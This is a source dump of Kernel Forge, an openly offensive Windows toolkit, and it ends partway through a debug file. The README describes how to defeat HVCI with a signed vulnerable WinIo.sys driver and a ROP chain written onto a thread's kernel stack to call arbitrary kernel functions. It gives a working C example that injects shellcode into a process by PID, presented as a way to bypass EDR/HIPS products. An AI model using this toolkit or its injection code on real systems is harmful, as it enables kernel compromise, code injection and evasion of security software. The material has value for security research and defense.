Project Path: arc_Cr4sh_KernelForge_lm57e1he

Source Tree:

```txt
arc_Cr4sh_KernelForge_lm57e1he
├── README.MD
├── common
│   ├── common.cpp
│   ├── common.h
│   ├── debug.cpp
│   ├── debug.h
│   ├── ntdll_defs.h
│   ├── ntdll_undocnt.h
│   ├── peimage.cpp
│   ├── peimage.h
│   ├── service.cpp
│   ├── service.h
│   └── virtmem.h
├── dll_inject_shellcode.cpp
├── dll_inject_shellcode.h
├── docs
│   └── images
│       ├── kforge_example.png
│       ├── rop_gadget.png
│       ├── vtl_kernel_functions.png
│       └── winio_signature.png
├── dummy
│   ├── dummy.cpp
│   ├── dummy.vcxproj
│   ├── dummy.vcxproj.filters
│   ├── stdafx.cpp
│   ├── stdafx.h
│   └── targetver.h
├── dummy.dll
├── dummy.pdb
├── include
│   ├── kforge_driver.h
│   └── kforge_library.h
├── kforge
│   ├── kforge.cpp
│   ├── kforge.def
│   ├── kforge.vcxproj
│   ├── kforge.vcxproj.filters
│   ├── stdafx.h
│   └── targetver.h
├── kforge.dll
├── kforge.pdb
├── kforge.sln
├── kforge_driver
│   ├── kforge_driver.cpp
│   ├── kforge_driver.vcxproj
│   ├── kforge_driver.vcxproj.filters
│   ├── pre_build.bat
│   ├── stdafx.h
│   ├── winio.cpp
│   └── winio.h
├── kforge_driver.lib
├── kforge_example
│   ├── func_order.txt
│   ├── kforge_example.cpp
│   ├── kforge_example.vcxproj
│   ├── kforge_example.vcxproj.filters
│   ├── stdafx.cpp
│   ├── stdafx.h
│   └── targetver.h
├── kforge_example.exe
├── kforge_example.pdb
├── kforge_library
│   ├── kforge_library.cpp
│   ├── kforge_library.vcxproj
│   ├── kforge_library.vcxproj.filters
│   └── stdafx.h
├── kforge_library.lib
├── tools
│   └── make_header.py
└── winio.sys

```

`README.MD`:

```MD

# Kernel Forge library for Windows

[General information](#general-information)  
[Contents](#contents)  
[How does it work](#how-does-it-work)  
[Kernel Forge API](#kernel-forge-api)  
[Usage example](#usage-example)  
[Interfacing Secure Kernel with Kernel Forge](#interfacing-secure-kernel-with-kernel-forge)  

## General information

Today <a href="https://www.microsoft.com/en-us/windowsforbusiness/windows10-secured-core-computers">more and more Windows machines</a> comes with VBS enabled by default which forces rootkits and kernel exploits developers to accept new challenges. [Windows Virtualization-based Security (VBS)](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) uses hardware virtualization features and Hyper-V to host a number of security services, providing them with greatly increased protection from vulnerabilities in the operating system, and preventing the use of malicious exploits which attempt to defeat protections. One of such services is [Hypervisor-Enforced Code Integrity (HVCI)](https://docs.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity) that uses VBS to significantly strengthen code integrity policy enforcement.

 * **Q1:** On HVCI enabled target I can't execute my own kernel code anymore, even with most awesome local privileges escalation kernel exploit that gives powerful arbitrary memory read write primitives.  

 * **A1:** You can use data only attack to overwrite process token, gain Local System and load any <a href="https://github.com/hfiref0x/KDU#currently-supported-providers">legitimate 3-rd party WHQL signed driver</a> that provides an access to I/O ports, physical memory and MSR registers.  

 * **Q2:** But what if I want to call an arbitrary kernel functions with arbitrary arguments?  

 * **A2:** That's why I made Kernel Forge library, it provides convenient API for this exact purpose.  

Kernel Forge consists from two main components: <a href="https://github.com/Cr4sh/KernelForge/blob/master/kforge_library/kforge_library.cpp">the first library</a> implements main functionality required to call an arbitrary kernel functions and <a href="https://github.com/Cr4sh/KernelForge/blob/master/kforge_driver/kforge_driver.cpp">the second library</a> used to delegate arbitrary memory read write primitives: it can be local privileges escalation exploit or just some wrapper around 3-rd party WHQL signed loldriver. For this project I'm using `WinIo.sys` variation that provides full physical memory access and works just fine even with enabled HVCI:

<img src="https://raw.githubusercontent.com/Cr4sh/KernelForge/master/docs/images/winio_signature.png" width="474" />


## Contents

Kernel Forge code base consists from the following files:

 * `kforge_driver/` &minus; Static library of `WinIo.sys` driver wrapper that provides memory read/write API.

 * `kforge_library/` &minus; Static library that implements main functionality of the Kernel Forge.

 * `kforge/` &minus; DLL version of the Kernel Forge library for its interfacing with different languages <a href="https://en.wikipedia.org/wiki/Foreign_function_interface">using CFFI</a>.

 * `include/kforge_driver.h` &minus; `kforge_driver.lib` program interface.

 * `include/kforge_library.h` &minus; `kforge_library.lib` program interface.

 * `kforge_example/` &minus; An example program that uses `kforge_library.lib` API to perform <a href="https://github.com/Cr4sh/s6_pcie_microblaze/blob/c13c744ddbc5b3e8dd89dde03ceaa3c7d0240f8e/python/payloads/DmaBackdoorHv/backdoor_client/vm_exec_kernel/vm_exec_kernel.cpp#L185">a classical</a> kernel mode to user mode DLL injection attack.

 * `dll_inject_shellcode.cpp`/`dll_inject_shellcode.h` &minus; Shellcode used by `kforge_example.exe` to handle injected DLL image imports and do other things.

 * `dummy/` &minus; Dummy DLL project to use with `kforge_example.exe` that shows message box after its injection into some process.


## How does it work

The idea behind Kernel Forge is very simple, there's no any innovative exploitation techniques, just common things already known for security researches but in more convenient form of the library to use it with 3-rd party projects.  

Many kernel mode payloads can be considered just as sequence of function calls, but as long as we can't have any attacker controlled executable code in kernel space because of HVCI, Kernel Forge uses the following approach to perform such kernel function calls from user mode:

 1. Create new event object and new dummy thread that calls `WaitForSingleObject()` on this event to switch itself into the wait state. At this moment dummy thread call stack has the following look:

```
Child-SP          RetAddr           Call Site
fffff205`b0bfa660 fffff805`16265850 nt!KiSwapContext+0x76
fffff205`b0bfa7a0 fffff805`16264d7f nt!KiSwapThread+0x500
fffff205`b0bfa850 fffff805`16264623 nt!KiCommitThreadWait+0x14f
fffff205`b0bfa8f0 fffff805`1662cae1 nt!KeWaitForSingleObject+0x233
fffff205`b0bfa9e0 fffff805`1662cb8a nt!ObWaitForSingleObject+0x91
fffff205`b0bfaa40 fffff805`164074b5 nt!NtWaitForSingleObject+0x6a
fffff205`b0bfaa80 00007ffc`f882c6a4 nt!KiSystemServiceCopyEnd+0x25 (TrapFrame @ fffff205`b0bfaa80)
00000094`169ffce8 00007ffc`f630a34e ntdll!NtWaitForSingleObject+0x14
00000094`169ffcf0 00007ff6`66d72edd KERNELBASE!WaitForSingleObjectEx+0x8e
00000094`169ffd90 00000000`00000000 kforge_example!DummyThread+0xd
```

 2. Meanwhile, main thread uses `NtQuerySystemInformation()` native API function with `SystemHandleInformation` information class to find dummy thread `_KTHREAD` structure address.

 3. Arbitrary memory read primitive is used to obtain `StackBase` and `KernelStack` fields of `_KTHREAD` structure that keeps an information about dummy thread kernel stack location.

 4. Arbitrary memory read primitive is used to traverse dummy thread kernel stack starting from its bottom to locate return address from `nt!NtWaitForSingleObject()` back to the `nt!KiSystemServiceCopyEnd()` function of system calls dispatcher. 

 5. Then Kernel Forge <a href="https://github.com/Cr4sh/KernelForge/blob/e4f5f10f474c9316776c6679e3347d8e8fe1bf0a/kforge_library/kforge_library.cpp#L583">constructs some ROP chain</a> to call desired kernel function with specified arguments, save its return value into the user mode memory and pass execution to `nt!ZwTerminateThread()` for graceful shutdown of dummy thread after the ROP chain execution. Arbitrary memory write primitive is used to overwrite previously located return address with an address of the first ROP gadget:

 <img src="https://raw.githubusercontent.com/Cr4sh/KernelForge/master/docs/images/rop_gadget.png" width="636" />

 6. And finally, Kernel Forge main thread sets event object to signaled state which resumes dummy thread and triggers ROP chain execution.

As you can see, it's pretty reliable technique with no any magic involved. Of course, this approach has a plenty of obvious limitations:

 * You can't use Kernel Forge to call `nt!KeStackAttachProcess()` function that changes current process address space.

 * You can execute your calls at <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/managing-hardware-priorities">passive IRQL level</a> only.

 * You can't call any functions that registers kernel mode callbacks, like `nt!IoSetCompletionRoutine()`, `nt!
PsSetCreateProcessNotifyRoutine()` and others.

In addition, `kforge_driver.lib` is relying on `WinIo.sys` driver that provides only physical memory access. To achieve virtual memory access having this we need to find PML4 page map location of the kernel virtual address space. Currently <a href="https://github.com/Cr4sh/KernelForge/blob/e4f5f10f474c9316776c6679e3347d8e8fe1bf0a/kforge_driver/kforge_driver.cpp#L60">I'm using</a> `PROCESSOR_START_BLOCK` structure scan approach to get PML4 address from one of its fields. However, `PROCESSOR_START_BLOCK` is not present on machines with legacy boot, but this fact is rather not a real problem because you can't have HVCI support on such machines due to <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-requirements">its strict requirements</a>.

However, even with mentioned limitations you still can develop pretty much useful kernel mode payloads for HVCI enabled targets. On the picture you can see `kforge_example.exe` utility that calls appropriate kernel functions with `kfroge_library.lib` API to perform DLL injection into the user mode process with `KernelMode` value of the `KPROCESSOR_MODE` which might be suitable for EDR/HIPS security products bypass:

<img src="https://raw.githubusercontent.com/Cr4sh/KernelForge/master/docs/images/kforge_example.png" width="762" />


## Kernel Forge API

Kernel Forge library provides the following C API:

```C++
/**
 * Initialize Kernel Forge library: reads kernel image into the user mode memory,
 * finds needed ROP gadgets, etc, etc.
 *
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfInit(void);
```

```C++
/**
 * Uninitialize Kernel Forge library when you don't need to use its API anymore.
 *
 * @return TRUE if success and FALSE in case of error.
 */
BOOL KfUninit(void);
```

```C++
/**
 * Call kernel function by its name, it can be exported ntoskrnl.exe function
 * or not exported Zw function.
 *
 * @param lpszProcName Name of the function to call.
 * @param Args Array with its arguments.
 * @param dwArgsCount Number of the arguments.
 * @param pRetVal Pointer to the variable that receives return value of the function.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfCall(char *lpszProcName, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal);
```

```C++
/**
 * Call an arbitrary function by its kernel address.
 *
 * @param ProcAddr Address of the function to call.
 * @param Args Array with its arguments.
 * @param dwArgsCount Number of the arguments.
 * @param pRetVal Pointer to the variable that receives return value of the function.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfCallAddr(PVOID ProcAddr, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal);
```

```C++
/**
 * Get system call number by appropriate ntdll native API function name.
 *
 * @param lpszProcName Name of the function.
 * @param pdwRet Pointer to the variable that receives system call number.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfGetSyscallNumber(char *lpszProcName, PDWORD pdwRet);
```

```C++
/**
 * Get an actual kernel address of the function exported by ntoskrnl.exe image.
 *
 * @param lpszProcName Name of exported function.
 * @return Address of the function or NULL in case of error.
 */
PVOID KfGetKernelProcAddress(char *lpszProcName);
```

```C++
/**
 * Get an actual kernel address of not exported Zw function of ntoskrnl.exe image
 * using signature based search.
 *
 * @param lpszProcName Name of Zw function to search for.
 * @return Address of the function or NULL in case of error.
 */
PVOID KfGetKernelZwProcAddress(char *lpszProcName);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!ExAllocatePool() function to allocate
 * specified amount of non paged kernel heap memory.
 *
 * @param Size Number of bytes to allocate.
 * @return Kernel address of allocated memory or NULL in case of error.
 */
PVOID KfHeapAlloc(SIZE_T Size);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!ExAllocatePool() function to allocate
 * specified amount of non paged kernel heap memory and copy specified data from
 * the user mode into the allocated memory.
 *
 * @param Size Number of bytes to allocate.
 * @param Data Data to copy into the allocated memory.
 * @return Kernel address of allocated memory or NULL in case of error.
 */
PVOID KfHeapAllocData(SIZE_T Size, PVOID Data);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!ExFreePool() function to free the memory
 * that was allocated by KfHeapAlloc() or KfHeapAllocData() functions.
 *
 * @param Addr Address of the memory to free.
 */
void KfHeapFree(PVOID Addr);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!memcpy() function to copy arbitrary data
 * between kernel mode and user mode or vice versa.
 *
 * @param Dst Address of the destination memory.
 * @param Src Address of the source memory.
 * @param Size Number of bytes to copy.
 * @return Destination memory address if success or NULL in case of error.
 */
PVOID KfMemCopy(PVOID Dst, PVOID Src, SIZE_T Size);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!memset() function to fill memory region
 * with specified character.
 *
 * @param Dst Address of the destination memory.
 * @param Val Character to fill.
 * @param Size Number of bytes to fill.
 * @return Destination memory address if success or NULL in case of error.
 */
PVOID KfMemSet(PVOID Dst, int Val, SIZE_T Size);
```

To use Kernel Forge with your own loldriver or kernel exploit you just need to implement a custom version of `kforge_driver.lib` library <a href="https://github.com/Cr4sh/KernelForge/blob/master/include/kforge_driver.h">with fairly simple program interface</a>.


## Usage example

Here you can see a bit simplified C code that uses Kernel Forge API to inject caller specified shellcode into the user mode process by its PID:

```C++
BOOL ShellcodeInject(HANDLE ProcessId, PVOID Shellcode, SIZE_T ShellcodeSize)
{
    BOOL bRet = FALSE;
    DWORD_PTR Status = 0;
    HANDLE hProcess = NULL, hThread = NULL;        
    SIZE_T MemSize = ShellcodeSize;
    PVOID MemAddr = NULL;

    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES ObjAttr;       

    InitializeObjectAttributes(&ObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    ClientId.UniqueProcess = ProcessId;
    ClientId.UniqueThread = NULL;

    // initialize Kernel Forge library
    if (!KfInit())
    {
        goto _end;
    }

    PVOID Args_1[] = { KF_ARG(&hProcess),                   // ProcessHandle
                       KF_ARG(PROCESS_ALL_ACCESS),          // DesiredAccess
                       KF_ARG(&ObjAttr),                    // ObjectAttributes
                       KF_ARG(&ClientId) };                 // ClientId

    // open the target process by its PID
    if (!KfCall("ZwOpenProcess", Args_1, 4, KF_RET(&Status)))
    {
        goto _end;
    }

    if (NT_ERROR(Status))
    {
        goto _end;
    }

    PVOID Args_2[] = { KF_ARG(hProcess),                    // ProcessHandle    
                       KF_ARG(&MemAddr),                    // BaseAddress
                       KF_ARG(0),                           // ZeroBits
                       KF_ARG(&MemSize),                    // RegionSize
                       KF_ARG(MEM_COMMIT | MEM_RESERVE),    // AllocationType
                       KF_ARG(PAGE_EXECUTE_READWRITE) };    // Protect

    // allocate memory for the shellcode
    if (!KfCall("ZwAllocateVirtualMemory", Args_2, 6, KF_RET(&Status)))
    {
        goto _end;
    }    

    if (NT_ERROR(Status))
    {
        goto _end;
    }

    PVOID Args_3[] = { KF_ARG(hProcess),                    // ProcessHandle    
                       KF_ARG(MemAddr),                     // BaseAddress
                       KF_ARG(Shellcode),                   // Buffer
                       KF_ARG(ShellcodeSize),               // NumberOfBytesToWrite
                       KF_ARG(NULL) };                      // NumberOfBytesWritten

    // copy shellcode data into the allocated memory
    if (!KfCall("ZwWriteVirtualMemory", Args_3, 5, KF_RET(&Status)))
    {
        goto _end;
    }    

    if (NT_ERROR(Status))
    {
        goto _end;
    }

    PVOID Args_4[] = { KF_ARG(hProcess),                    // ProcessHandle
                       KF_ARG(NULL),                        // SecurityDescriptor
                       KF_ARG(FALSE),                       // CreateSuspended
                       KF_ARG(0),                           // StackZeroBits
                       KF_ARG(NULL),                        // StackReserved
                       KF_ARG(NULL),                        // StackCommit
                       KF_ARG(MemAddr),                     // StartAddress 
                       KF_ARG(NULL),                        // StartParameter
                       KF_ARG(&hThread),                    // ThreadHandle
                       KF_ARG(&ClientId) };                 // ClientId

    // create new thread to execute the shellcode
    if (!KfCall("RtlCreateUserThread", Args_4, 10, KF_RET(&Status)))
    {
        goto _end;
    }    

    if (NT_SUCCESS(Status))
    {
        // shellcode was successfully injected
        bRet = TRUE;
    }

_end:

    // uninitialize Kernel Forge library
    KfUninit();

    return bRet;
}
```

For more complete example please refer to the `kforge_example.exe` <a href="https://github.com/Cr4sh/KernelForge/blob/master/kforge_example/kforge_example.cpp">source code</a>.


## Interfacing Secure Kernel with Kernel Forge

On VBS/HVCI enabled machines Hyper-V functionality is employed to logically divide the system into the two separate "worlds": normal world (VTL0) running a regular NT kernel (ntoskrnl) that we’re all familiar with and isolated secure world (VTL1) running a Secure Kernel (SK). To learn more about VBS/HVCI internals I can recommend you the following materials:

 * [Live forensics on the Windows 10 secure kernel](https://www.semanticscholar.org/paper/Live-forensics-on-the-Windows-10-secure-kernel.-Brendmo/e275cc28c5c8e8e158c45e5e773d0fa3da01e118) by Hans Kristian Brendmo

 * [Work Package 6: Virtual Secure Mode](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Cyber-Sicherheit/SiSyPHus/Workpackage6_Virtual_Secure_Mode.pdf?__blob=publicationFile&v=2) by [The BSI](https://www.bsi.bund.de/EN/TheBSI/thebsi_node.html)

 * [Battle Of The SKM And IUM: How Windows 10 Rewrites OS Architecture](https://www.youtube.com/watch?v=LqaWIn4y26E) by [Alex Ionescu](https://twitter.com/aionescu)

 * [Breaking VSM by Attacking Secure Kernel](https://i.blackhat.com/USA-20/Thursday/us-20-Amar-Breaking-VSM-By-Attacking-SecureKernal.pdf) by [Saar Amar](https://twitter.com/AmarSaar) and [Daniel King](https://twitter.com/long123king)

Also, have a look at <a href="https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv">my Hyper-V backdoor project</a> that allows to bypass HCVI, load custom kernel drivers in VTL1, run 3-rd party trustlets in Isolated User Mode (IUM) and do many others things.  

To communicate with Secure Kernel ntoskrnl uses special VTL0 to VTL1 hypercalls documented in [Hyper-V Hypervisor Top-Level Functional Specification](https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/tlfs) which are performed by `nt!HvlSwitchToVsmVtl1()` helper function. This not exported function is used by dozens of others not exported ntoskrnl functions to perform various actions, most of them has `Vsl` prefix:

<img src="https://raw.githubusercontent.com/Cr4sh/KernelForge/master/docs/images/vtl_kernel_functions.png" width="720" />

This set of `Vsl` functions exposes particularly interesting attack surface for fuzzing and exploitation of VTL1 and Secure Kernel isolated environment. Using Kernel Forge you can call this functions from user mode program without use of any complicated and not very convenient solutions like my Hyper-V backdoor or <a href="https://github.com/commial/experiments/tree/master/debugging-secure-kernel">QEMU based debugger</a>. To interact with Secure Kernel by calling `Vsl` functions of NT kernel it's more suitable to use `kforge.dll` from Python code with [ctypes library](https://docs.python.org/3/library/ctypes.html) as foreign functions interface and something like [pdbparse](https://github.com/moyix/pdbparse) to extract not exported functions addresses from debug symbols.


## TODO

 * At this moment Kernel Forge has no support of chained calls, ie., single shot of the dummy thread can execute only one user specified kernel function. However, thread kernel stack has enough of free space to fit more ROP gadgets which might allow to perform multiple calls as single sequence. Such feature might be used to call various kernel functions designed to work in pair (like `KeStackAttachProcess`/`KeUnstackDetachProcess`, `KeRaiseIrql`/`KeLowerIrql`, etc.) and overcome some of the limitations described above.


## Developed by

Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com<br/>
http://blog.cr4.sh<br/>
[@d_olex](http://twitter.com/d_olex)<br/>

```

`common/common.cpp`:

```cpp
#include "stdafx.h"
//--------------------------------------------------------------------------------------
char *GetNameFromFullPath(char *lpszPath)
{
    char *lpszName = lpszPath;

    for (size_t i = 0; i < strlen(lpszPath); i++)
    {
        if (lpszPath[i] == '\\' || lpszPath[i] == '/')
        {
            lpszName = lpszPath + i + 1;
        }
    }

    return lpszName;
}
//--------------------------------------------------------------------------------------
BOOL ReadFromFile(HANDLE hFile, PVOID *pData, PDWORD pdwDataSize)
{
    BOOL bRet = FALSE;

    DWORD dwDataSizeHigh = 0;
    DWORD dwDataSize = GetFileSize(hFile, &dwDataSizeHigh);
    if (dwDataSize > 0)
    {
        if (dwDataSizeHigh != 0)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: File is too large\n");
            return FALSE;
        }

        PVOID Data = M_ALLOC(dwDataSize);
        if (Data)
        {
            DWORD dwReaded = 0;

            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

            if (ReadFile(hFile, Data, dwDataSize, &dwReaded, NULL))
            {
                *pData = Data;
                *pdwDataSize = dwDataSize;

                bRet = TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "ReadFile() ERROR %d\n", GetLastError());
                
                M_FREE(Data);
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): File is empty\n");
    }

    return bRet;
}

BOOL ReadFromFile(LPCTSTR lpszFileName, PVOID *pData, PDWORD pdwDataSize)
{
    BOOL bRet = FALSE;

    // open file for reading
    HANDLE hFile = CreateFile(
        lpszFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (hFile != INVALID_HANDLE_VALUE)
    {
        if (pData == NULL || pdwDataSize == NULL)
        {
            // just check for existing file
            bRet = TRUE;
        }
        else
        {
            // read data from the file
            bRet = ReadFromFile(hFile, pData, pdwDataSize);
        }

        CloseHandle(hFile);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "CreateFile() ERROR %d\n", GetLastError());
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL DumpToFile(HANDLE hFile, PVOID Data, DWORD dwDataSize)
{
    BOOL bRet = FALSE;
    DWORD dwWritten = 0;

    // write starting from the beginning of the file
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

    if (WriteFile(hFile, Data, dwDataSize, &dwWritten, NULL))
    {
        SetEndOfFile(hFile);
        bRet = TRUE;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "WriteFile() ERROR %d\n", GetLastError());
    }

    return bRet;
}

BOOL DumpToFile(char *lpszFileName, PVOID Data, DWORD dwDataSize)
{
    BOOL bRet = FALSE;

    // open file for writing
    HANDLE hFile = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        // write data to the file
        bRet = DumpToFile(hFile, Data, dwDataSize);
        CloseHandle(hFile);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "CreateFile() ERROR %d\n", GetLastError());
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
int LoadPrivileges(char *lpszName)
{
    BOOL bRet = FALSE;
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES Privs;
    LUID Luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        DbgMsg(__FILE__, __LINE__, "OpenProcessToken() ERROR %d\n", GetLastError());
        goto _end;
    }

    if (!LookupPrivilegeValueA(NULL, lpszName, &Luid))
    {
        DbgMsg(__FILE__, __LINE__, "LookupPrivilegeValue() ERROR %d\n", GetLastError());
        goto _end;
    }

    Privs.PrivilegeCount = 1;
    Privs.Privileges[0].Luid = Luid;
    Privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &Privs, sizeof (Privs), NULL, NULL))
    {
        DbgMsg(__FILE__, __LINE__, "AdjustTokenPrivileges() ERROR %d\n", GetLastError());
        goto _end;
    }

    bRet = TRUE;

_end:

    if (hToken)
    {
        CloseHandle(hToken);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
PVOID GetSystemInformation(SYSTEM_INFORMATION_CLASS InfoClass)
{
    NTSTATUS Status = 0;
    ULONG RetSize = 0, Size = 0x100;
    PVOID Info = NULL;

    GET_NATIVE(NtQuerySystemInformation);

    if (f_NtQuerySystemInformation == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to obtain needed functions\n");
        return NULL;
    }

    while (true)
    {
        RetSize = 0;

        // allocate memory for system information
        if ((Info = M_ALLOC(Size)) == NULL)
        {
            DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
            return NULL;
        }

        // query information        
        if ((Status = f_NtQuerySystemInformation(InfoClass, Info, Size, &RetSize)) == STATUS_INFO_LENGTH_MISMATCH)
        {
            // buffer is too small
            M_FREE(Info);

            // allocate more memory and try again
            Size = RetSize + 0x100;            
        }
        else
        {
            break;
        }
    }

    if (!NT_SUCCESS(Status))
    {
        DbgMsg(__FILE__, __LINE__, "NtQuerySystemInformation() ERROR 0x%.8x\n", Status);

        if (Info)
        {
            // cleanup
            M_FREE(Info);
        }

        return NULL;
    }

    return Info;
}
//--------------------------------------------------------------------------------------
DWORD GetThreadState(DWORD dwProcessId, DWORD dwThreadId)
{
    DWORD Ret = -1;

    // query processes and threads information
    PSYSTEM_PROCESS_INFORMATION ProcessInfo = 
        (PSYSTEM_PROCESS_INFORMATION)GetSystemInformation(SystemProcessInformation);

    if (ProcessInfo)
    {
        PSYSTEM_PROCESS_INFORMATION Info = ProcessInfo;

        while (true)
        {
            // check for desired process
            if (Info->UniqueProcessId == (HANDLE)dwProcessId)
            {
                // enumerate treads
                for (DWORD i = 0; i < Info->NumberOfThreads; i += 1)
                {
                    // check for desired thread
                    if (Info->Threads[i].ClientId.UniqueThread == (HANDLE)dwThreadId)
                    {
                        Ret = Info->Threads[i].ThreadState;
                        goto _end;
                    }
                }

                break;
            }

            if (Info->NextEntryOffset == 0)
            {
                // end of the list
                break;
            }

            // go to the next process info entry
            Info = (PSYSTEM_PROCESS_INFORMATION)RVATOVA(Info, Info->NextEntryOffset);
        }
_end:
        M_FREE(ProcessInfo);
    }

    return Ret;
}
//--------------------------------------------------------------------------------------
PVOID GetObjectAddress(HANDLE hObject)
{
    PVOID Ret = NULL;

    // query all system handles information
    PSYSTEM_HANDLE_INFORMATION HandleInfo = 
        (PSYSTEM_HANDLE_INFORMATION)GetSystemInformation(SystemHandleInformation);

    if (HandleInfo)
    {
        for (DWORD i = 0; i < HandleInfo->NumberOfHandles; i += 1)
        {
            // lookup for pointer to the our object
            if (HandleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() &&
                HandleInfo->Handles[i].HandleValue == (USHORT)hObject)
            {
                Ret = HandleInfo->Handles[i].Object;
                break;
            }
        }

        M_FREE(HandleInfo);
    }

    return Ret;
}
//--------------------------------------------------------------------------------------
// EoF

```

`common/common.h`:

```h

#define RVATOVA(_base_, _offset_) ((PUCHAR)(_base_) + (ULONG)(_offset_))

// numeric values alignment
#define _ALIGN_DOWN(_val_, _align_) ((_val_) & ~((_align_) - 1))
#define _ALIGN_UP(_val_, _align_) (((_val_) & ((_align_) - 1)) ? _ALIGN_DOWN((_val_), (_align_)) + (_align_) : (_val_))

#define _HI_DWORD(_qw_) ((ULONG)(((ULONG64)(_qw_) >> 32) & 0xffffffff))
#define _LO_DWORD(_qw_) ((ULONG)(ULONG64)(_qw_))

#define _LO_WORD(_dw_) ((USHORT)(((ULONG)(_dw_)) & 0xffff))
#define _HI_WORD(_dw_) ((USHORT)((((ULONG)(_dw_)) >> 16) & 0xffff))

#define _LO_BYTE(_w_) ((UCHAR)(((ULONG)(_w_)) & 0xff))
#define _HI_BYTE(_w_) ((UCHAR)((((ULONG)(_w_)) >> 8) & 0xff))

// heap allocation functions
#define M_ALLOC(_size_) LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, (_size_))
#define M_FREE(_addr_) LocalFree((_addr_))

#define TIME_ABSOLUTE(_t_) (_t_)
#define TIME_RELATIVE(_t_) (-(_t_))

// waitable timers macro definitions
#define TIME_NANOSECONDS(_t_)   (((signed __int64)(_t_)) / 100L)
#define TIME_MICROSECONDS(_t_)  (((signed __int64)(_t_)) * TIME_NANOSECONDS(1000L))
#define TIME_MILLISECONDS(_t_)  (((signed __int64)(_t_)) * TIME_MICROSECONDS(1000L))
#define TIME_SECONDS(_t_)       (((signed __int64)(_t_)) * TIME_MILLISECONDS(1000L))

// atomic access wrappers
#define INTERLOCKED_INC(_addr_) InterlockedIncrement((LONG *)(_addr_))
#define INTERLOCKED_GET(_addr_) InterlockedExchangeAdd((LONG *)(_addr_), 0)
#define INTERLOCKED_SET(_addr_, _val_) InterlockedExchange((LONG *)(_addr_), (LONG)(_val_))

#ifdef _X86_

#define INTERLOCKED_PTR_GET(_addr_) INTERLOCKED_GET(_addr_)
#define INTERLOCKED_PTR_SET(_addr_, _val_) INTERLOCKED_PTR_SET(_addr_, _val_)

#else _AMD64_

#define INTERLOCKED_PTR_GET(_addr_) InterlockedExchangeAdd64((LONGLONG *)(_addr_), 0)
#define INTERLOCKED_PTR_SET(_addr_, _val_) InterlockedExchangeAdd64((LONGLONG *)(_addr_), (LONGLONG)(_val_))

#endif


#define PAGE_SHIFT 12
#define PAGE_SIZE 0x1000

#define IFMT32 "0x%.8x"
#define IFMT64 "0x%.16I64x"

#define IFMT32_W L"0x%.8x"
#define IFMT64_W L"0x%.16I64x"

#ifdef _X86_

// 32-bit pointers format string
#define IFMT IFMT32
#define IFMT_W IFMT32_W

#else _AMD64_

// 64-bit pointers format string
#define IFMT IFMT64
#define IFMT_W IFMT64_W

#endif


#define GET_IMPORT(_lib_, _name_)                               \
                                                                \
    func_##_name_ f_##_name_ = (func_##_name_)GetProcAddress(   \
        LoadLibrary((_lib_)), #_name_);


#define GET_NATIVE(_name_) GET_IMPORT("ntdll.dll", _name_)


char *GetNameFromFullPath(char *lpszPath);

BOOL ReadFromFile(HANDLE hFile, PVOID *pData, PDWORD pdwDataSize);
BOOL ReadFromFile(LPCTSTR lpszFileName, PVOID *pData, PDWORD pdwDataSize);

BOOL DumpToFile(HANDLE hFile, PVOID Data, DWORD dwDataSize);
BOOL DumpToFile(char *lpszFileName, PVOID Data, DWORD dwDataSize);

BOOL LoadPrivileges(char *lpszName);

PVOID GetSystemInformation(SYSTEM_INFORMATION_CLASS InfoClass);
DWORD GetThreadState(DWORD dwProcessId, DWORD dwThreadId);
PVOID GetObjectAddress(HANDLE hObject);

```

`common/debug.cpp`:

```cpp
#include "stdafx.h"
//--------------------------------------------------------------------------------------
#ifdef DBG

